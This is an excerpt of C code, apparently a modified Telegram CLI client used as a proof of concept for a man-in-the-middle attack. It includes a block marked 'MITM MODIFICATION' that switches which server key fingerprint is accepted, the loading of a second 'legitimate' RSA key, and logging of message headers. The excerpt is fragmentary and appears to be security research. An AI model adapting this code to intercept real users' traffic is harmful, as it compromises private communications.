...
static int _print_auth_key_id(FILE *fd, long long auth_key_id) {
...
static int _print_enc_message(FILE *fd, struct encrypted_message *enc) {
  ...
  fprintf(fd, "HEADER: \n");
  fprintf(fd, "auth_key_id:"); 
  _print_auth_key_id(fd, enc->auth_key_id);
  fprintf(fd, "    msg_key: "); 
  for(i=0;i<16;i++) fprintf(fd, " %02x", 0xFF & enc->msg_key[i]); fprintf(fd, "\n");
...
RSA *pubKey, *legitimate_pubKey;
long long pk_fingerprint, legitimate_pk_fingerprint;

int legitimate_rsa_load_public_key (const char *public_key_name) {

  legitimate_pubKey = NULL;
  FILE *f = fopen (public_key_name, "r");
  if (f == NULL) {
    logprintf ( "Couldn't open public key file: %s\n", public_key_name);
    return -1;
  }
  legitimate_pubKey = PEM_read_RSAPublicKey (f, NULL, NULL, NULL);
  fclose (f);
  if (legitimate_pubKey == NULL) {
...
int process_respq_answer (struct connection *c, char *packet, int len) {
  ...
  for (i = 0; i < fingerprints_num; i++) {
    ...
    /* BEGIN OF MITM MODIFICATION */
    if (fingerprints[i] == legitimate_pk_fingerprint)  {
      break;
    }
    /* END OF MITM MODIFICATION */
  }
...
int aes_encrypt_message (struct dc *DC, struct encrypted_message *enc) {
  ...
  if(pocverbosity) {
    fprintf(stdout, "[%.02lf Sending to: %s:%d]\n", get_utime(CLOCK_REALTIME), DC->ip, DC->port);
    fprintf(stdout, "------ BEGIN MSG TO ENCRYPT ------\n");
    _print_enc_message(stdout, enc);
    fprintf(stdout, "------ END MSG TO ENCRYPT ------\n");
  }
...
int process_rpc_message (struct connection *c UU, struct encrypted_message *enc, int len) {
  ...
  if(pocverbosity) {
    fprintf(stdout, "[%.02lf Received from: %s:%d]\n", get_utime(CLOCK_REALTIME), c->ip, c->port);
    _print_enc_message(stdout, enc);
  }
...
void on_start (void) {
  ...
  if (rsa_public_key_name) {
    ...
    if (legitimate_rsa_load_public_key ("legit-tg.pub") < 0) {
      perror ("rsa_load_public_key");
      exit (1);
    }
    ...
    if (legitimate_rsa_load_public_key ("legit-tg.pub") < 0 && rsa_load_public_key ("/etc/" PROG_NAME "/legit-server.pub") < 0) {
      perror ("rsa_load_public_key");
      exit (1);
    }
  ...
  legitimate_pk_fingerprint = compute_rsa_key_fingerprint (legitimate_pubKey);
}
